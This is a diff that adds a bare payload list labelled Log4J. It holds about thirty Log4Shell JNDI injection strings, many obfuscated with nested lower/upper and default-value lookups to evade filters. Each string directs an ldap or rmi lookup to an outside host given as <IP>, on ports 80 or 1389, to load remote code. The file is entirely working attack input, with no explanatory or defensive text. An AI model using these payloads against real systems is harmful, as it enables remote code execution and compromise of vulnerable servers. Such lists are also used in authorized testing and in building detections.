@@ -1,0 +1,37 @@
+==============================================================================
+[+] Log4J
+==============================================================================
+
+${jndi:ldap://<IP>:80/ badClassName}
+${jndi:ldap://<IP>/ badClassName}
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://<IP>/poc}
+${${::-j}ndi:rmi://<IP>/ass}
+${jndi:rmi://<IP>}
+${${lower:jndi}:${lower:rmi}://<IP>/poc}
+${${lower:${lower:jndi}}:${lower:rmi}://<IP>/poc}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://<IP>/poc}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://<IP>/poc}
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://<IP>:80/poc}
+${${::-j}ndi:rmi://<IP>:80/ass}
+${jndi:rmi://<IP>:80}
+${${lower:jndi}:${lower:rmi}://<IP>:80/poc}
+${${lower:${lower:jndi}}:${lower:rmi}://<IP>:80/poc}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://<IP>:80/poc}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://<IP>:80/poc}
+${jndi:ldap://<IP>:1389/ badClassName}
+${jndi:ldap://<IP>/ badClassName}
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://<IP>/poc}
+${${::-j}ndi:rmi://<IP>/ass}
+${jndi:rmi://<IP>}
+${${lower:jndi}:${lower:rmi}://<IP>/poc}
+${${lower:${lower:jndi}}:${lower:rmi}://<IP>/poc}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://<IP>/poc}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://<IP>/poc}
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://<IP>:1389/poc}
+${${::-j}ndi:rmi://<IP>:1389/ass}
+${jndi:rmi://<IP>:1389}
+${${lower:jndi}:${lower:rmi}://<IP>:1389/poc}
+${${lower:${lower:jndi}}:${lower:rmi}://<IP>:1389/poc}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://<IP>:1389/poc}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://<IP>:1389/poc}
+
